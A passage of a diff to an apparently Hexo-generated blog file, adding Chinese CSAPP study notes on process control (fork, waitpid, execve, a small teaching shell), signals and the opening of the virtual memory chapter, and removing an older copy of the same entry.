+<p>下图为一对进程上下文切换的示例，进程A初始运行在用户模式在，直到执行系统调用read陷入内核，内核中的陷阱处理程序请求来自磁盘控制器的DMA传输，并安排在磁盘控制器完成从磁盘到内存的数据传输后，磁盘中断处理器：</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/89.png" class="">
+
+<p>上下文切换：</p>
+<ol>
+<li>保存当前进程的上下文。</li>
+<li>恢复某个先前被强占的进程被保存的上下文。</li>
+<li>将控制传递给这个新恢复的进程。</li>
+</ol>
+<h4 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h4><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/90.png" class="">
+
+<h4 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h4><h5 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h5><p>每个进程都有唯一的正数（非0）进程ID（PID），getpid函数返回调用进程的PID，getppid函数返回他的父进程的PID（创建调用进程的进程）。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span>；</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在Linux系统上pid_t被定义为int类型。</p>
+<h5 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h5><p>从程序员角度，可以认为进程总是处于下面三种状态之一：</p>
+<ul>
+<li>运行。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</li>
+<li>停止。进程的执行被挂起，且不会被调度，当收到SIGSTOP、SIGTSTP、SIGTTIN或者SIGTTOU信号时，进程会停止，并保持停止直到它收到一个SIGCONT信号，在这个时刻，进程再次开始运行。</li>
+<li>终止。进程永远的停止，进程会因为三种原因终止：<ol>
+<li>收到一个信号，该信号的默认行为是终止进程。</li>
+<li>从主程序返回。</li>
+<li>调用exit函数。</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>exit函数以status退出状态来终止进程（另一种设置退出状态的方法是从主程序返回一个整数值）。父进程调用fork函数创建一个新的运行的子进程。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    新创建的子进程几乎但不完全与父进程相同，子进程得到与父进程用户级虚拟地址空间相同的但是独立的一个副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着父进程调用fork时，子进程可以读写父进程中打开的任何文件父进程和新创建的子进程最大的区别在于他们有不同的PID。<br>​     fork函数有趣的在于它调用一次，但是会返回两次，一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中fork返回的是子进程的PID，在子进程中fork返回0。因为子进程的PID总是非0，返回值就明确的分辨出程序是在父进程还是在子进程。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">1</span>;</span><br><span class="line">	pid=Fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//子进程</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child:x = %d\n&quot;</span>,++x);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;parent :x=%d\n &quot;</span>,--x);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/91.png" class="">
+
+<p> 从上述可以看到：</p>
+<ol>
+<li><p>调用一次，返回两次。fork函数被父进程调用一次，却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p>
+</li>
+<li><p>并发执行。父进程和子进程是并发运行的独立进程，内核能以任意方式交替执行它们的逻辑控制流中的指令。</p>
+</li>
+<li><p>相同但是独立的地址空间。</p>
+</li>
+<li><p>共享文件。子进程共享了父进程打开的文件，stdout。所以子进程输出也是指向屏幕。</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Fork();</span><br><span class="line">   Fork();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/92.png" class="">
+
+<h5 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h5><p>​    当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除，相反进程被保持在一种已终止的状态中，直到被父进程回收，当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。从此时开始，该进程就不存在了。一个终止了但没有被回收的进程称为僵尸进程。</p>
+<p>​    如果一个父进程终止了，内核会安排init进程称为它的孤儿进程（如果父进程先退出,子进程还没退出那么子进程将被 托孤给init进程）的养父。init进程的PID为1，是系统在启动时由内核创建的，他不会终止，是所有进程的祖先。如果父进程没有回收它的僵尸进程就终止了，那么内核会安排init进程回收它们，长时间运行的程序，比如shell或者服务器，总是应该回收它们的僵尸子进程，即使僵尸进程没有运行，仍然会消耗系统的内存资源。一个进程可以通过调用waitpid函数等待它的子进程终止或停止。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//成功返回子进程pid，WNOHANG则为0,其他错误-1</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，options=0时，waitpid挂起调用进程的执行，直到它的等待集合中一个子进程终止，如果等待集合中的一个进程在刚调用的时候就已经终止，那么waitpid立即返回。在这两种情况下，waitpid返回导致waitpid返回的已终止子进程的PID。此时，已终止的子进程已经被回收，内核会从系统中删除掉它的所有痕迹。</p>
+<ol>
+<li><p>判定等待集合的成员</p>
+<ul>
+<li>如果pid&gt;0，那么等待集合就是一个单独的子进程，它的进程ID等于pid</li>
+<li>如果pid=-1，那么等待集合就是由父进程所有的子进程组成</li>
+</ul>
+</li>
+<li><p>修改默认行为</p>
+<p>可以通过将options设置为常量WNOHANG、WUNTRACED和WCONTINUED的各种组合修改默认行为。</p>
+<ul>
+<li>WNOHANG：如果等待集合中的任何子进程都还没有终止，那么就立即返回，返回值为0，默认的行为是挂起调用进程，直到有子进程终止，在等待子进程终止的同时如果还有想做的工作，这个选项会有用。</li>
+<li>WUNTRACED：挂起调用进程的执行，直到等待集合中一个进程变成已终止或者已经被停止，返回的PID为呆滞返回的已终止或被停止的子进程的PID，默认的行为是只返回已终止的子进程。当想要金叉已终止和被停止的子进程时会有用。</li>
+<li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止，或等待集合中和一个被停止的进程收到SIGCONT信号重新开始执行。</li>
+</ul>
+<p>可以用或运算把这些选项组合起来。</p>
+</li>
+<li><p>检查已回收子进程的退出状态</p>
+<p>如果statusp参数是非空的，那么waitpid就会在status中放上关于导致返回子进程的状态信息，status是statusp指向的值。wait.h中定义了status参数的几个宏。</p>
+<ul>
+<li>WIFEXITED：如果子进程调用exit或者返回正常终止，就返回真。</li>
+<li>WEXITSTATUS：返回一个正常终止的子进程的退出状态，只有在WIFEXITED()返回为真时，才定义这个状态。</li>
+<li>WIFSIGNALED：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li>
+<li>WTERMSIG：返回导致子进程终止的信号的编号，只有在WIFSIGNALED()返回为真时，才定义这个状态。</li>
+<li>WIFSTOPPED：如果引起返回的子进程当前是停止的，那么返回真。</li>
+<li>WSTOPSIG：返回引起子进程停止的信号的编号。只有在WIFSTOPPED()返回为真才定义这个状态。</li>
+<li>WIFCONTINUED：如果子进程收到SIGCONT信号重新启动，则返回真。</li>
+</ul>
+</li>
+<li><p>错误条件</p>
+<p>如果调用进程没有子进程，那么waitpid返回-1，并设置errno为ECHILD。如果waitpid函数被一个信号中断，那么返回-1，并设置erron为EINTR。</p>
+</li>
+<li><p>wait函数</p>
+<p>wait函数是waitpid函数的简单版本。</p>
+<p>调用wait(&amp;status)等价于调用waitpid(-1,&amp;status,0)。</p>
+</li>
+</ol>
+<h5 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h5><p>sleep函数将一个进程挂起一段时间。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果请求的时间量已经到了，sleep返回0，否则返回还剩下的要休眠的秒数，后一种情况是可能的，如果sleep函数被一个信号中断而过早的返回，还有一个有用的函数是pause函数，该函数让调用函数休眠，直到进程收到一个信号。</p>
+<h5 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h5><p>​    execve函数在当前进程的上下文加载并运行一个新程序。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    execve函数加载并运行可执行目标文件filename，且带参数列表argv和环境变量列表envp。只有当出现错误时，例如找不到filename，execve才会返回到调用程序，所以，与fork一次调用两次返回不同，execve调用一次不返回。</p>
+<p>​    argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串，按惯例，argv[0]是可执行文件的名字，环境变量的列表是由一个类似的数据结构表示的，envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/93.png" class="">
+
+<p>在exceve加载了filename之后，调用一些启动代码，启动代码设置栈，并将控制传递给新程序的主函数，该主函数有如下形式：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>​    当main开始执行时，用户的栈组织结构如下图所示，从栈底（高地址）往栈顶（低地址）看，首先是参数和环境字符串，栈网上紧随其后的是以null结尾的指针数组，其中每个指针都指向栈中一个环境变量字符串，全局变量environ指向这些指针中的第一个envp[0]，紧跟环境变量数组之后的是以null结尾的argv[]数组，其中每个元素都指向栈中的一个参数字符串，在栈顶部是系统启动函数libc_start_main的栈帧。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/94.png" class="">
+
+<p>main函数又3个参数：</p>
+<ol>
+<li>argc,它给出argv[]数组中非空指针的数目</li>
+<li>argv，指向argv[]数组中的第一条目</li>
+<li>envp，指向envp[]数组中的第一个条目</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tsh&gt; &quot;</span>);</span><br><span class="line">        fgets(cmdline,MAXLINE,<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; </span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	eval(cmdline);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/*should the job run in bg or fg?*/</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    stpcpy(buf,cmdline);</span><br><span class="line">    bg = parseline(buf,argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;     <span class="comment">/*ignore empty line*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;                         <span class="comment">/*not a build in cmd*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found. \n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">int</span> status;</span><br><span class="line">        	<span class="keyword">if</span>(waitpid(pid, &amp;status, <span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">        		unix_error(<span class="string">&quot;waitfg:waitpid\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>,pid,cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">	buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	buf++;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) &#123;</span><br><span class="line">	argv[argc++] = buf;</span><br><span class="line">	*delim = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	buf = delim + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">	       buf++;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*buf == <span class="string">&#x27;\&#x27;&#x27;</span>) &#123;</span><br><span class="line">	    buf++;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    delim = <span class="built_in">strchr</span>(buf, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">&#x27;&amp;&#x27;</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">	argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span>    <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h4><p>信号是一种更高层的软件形式的异常，它允许进程和内核中断其他进程。一个信号就是一条小消息，它通知进程系统中发生一个某种类型的事件。每种信号对应某种系统事件，低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的，信号提供一种机制，通知用户进程发生了这些异常，比如，一个进程试图除以0，那么内核就会发送一个SIGFPE信号，如果一个进程执行一条非法指令，那么内核就发送给它一个SIGSEGV信号。下图为linux信号。</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/95.png" class="">
+
+<h2 id="第九章：虚拟内存"><a href="#第九章：虚拟内存" class="headerlink" title="第九章：虚拟内存"></a>第九章：虚拟内存</h2><p>什么是虚拟内存？</p>
+<p>​    内存容易被破坏，如果一个进程写入了另一个进程使用的内存，就有可能会造成崩溃。虚拟内存是对主存概念的抽象概念。</p>
+<p>用虚拟内存的好处：</p>
+<ul>
+<li>根据特定的需要在磁盘和主存之间告诉高速传输数据，从而高效使用缓存</li>
+<li>为每个进程提供相同的地址空间，从而简化内存管理</li>
+<li>保护每个内存空间的进程不被其他进程破坏</li>
+</ul>
+<h4 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h4><p>早期PC：物理寻址</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/96.png" class="">
+
+<p>近代PC：虚拟寻址</p>
+<p>​    CPU生成虚拟地址访问主存，虚拟地址被送到主存之前首先通过MMU转换为物理地址</p>
+<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/97.png" class="">
+
+
+
+<h4 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 地址空间</h4><p>非负整数地址的有序集合，在地址空间中的整数通常是连续的，我们称之为<strong>线性地址空间</strong>。</p>
+<h4 id="9-3-虚拟内存作为缓存工具"><a href="#9-3-虚拟内存作为缓存工具" class="headerlink" title="9.3 虚拟内存作为缓存工具"></a>9.3 虚拟内存作为缓存工具</h4><p>概念上而言，可以将虚拟内存（VM）理解为一个由存放在磁盘上的m个连续的字节大小的单元所组成的数组。</p>
+<p>VM系统将虚拟内存分割为虚拟页，同时将物理内存分割为物理页，每个页大小为2^p字节。</p>
+<p>在任意时刻，虚拟页面的集合都被分为三个不相交的子集：</p>
+<ul>
+<li>未分配的VM系统还未分配（或者创建）的页。未分配的块没有</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CSAPP</category>
       </categories>
   </entry>
   <entry>
@@ -1626,259 +1884,6 @@
 
 
 <p>编辑器在汇编代码中放入命令**.align 8**,指明了全局数据所需的对齐。保证了后面的数据的起始地址是8的倍数。</p>
-]]></content>
-      <categories>
-        <category>CSAPP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>深入理解计算机系统三</title>
-    <url>/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="第八章：异常控制流"><a href="#第八章：异常控制流" class="headerlink" title="第八章：异常控制流"></a>第八章：异常控制流</h2><p><strong>控制流：</strong></p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/78.png" class="">
-
-<h4 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h4><p>​    异常是异常控制流的一种形式，一部分由硬件实现，一部分由操作系统实现，这一节中主要是对异常和异常处理有一个一般性的了解。异常就是控制流中的突变，用来相应处理器状态中的某些变化。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/79.png" class="">
-
-<p>在任何情况下，当处理器检测到有事件发生，会通过一张叫<strong>异常表</strong>的跳转表，进行一个间接过程调用（异常），到一个专门设计用来处理这类时间的操作系统子程序（<strong>异常处理程序</strong>）。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
-
-<p>当异常处理程序完成以后，根据引起异常的事件类型会发生以下三种情况的一种：</p>
-<ol>
-<li><p>处理程序将控制返回给当前的指令Icurr，即当事件发生时正在执行的指令。</p>
-</li>
-<li><p>处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。</p>
-</li>
-<li><p>处理程序终止被中断的程序。</p>
-</li>
-</ol>
-<h5 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h5><p>系统中为每种类型的异常分配了唯一的非负整数的异常号，一些是处理器的设计者分配的，其他是操作系统内核设计者分配的。</p>
-<ul>
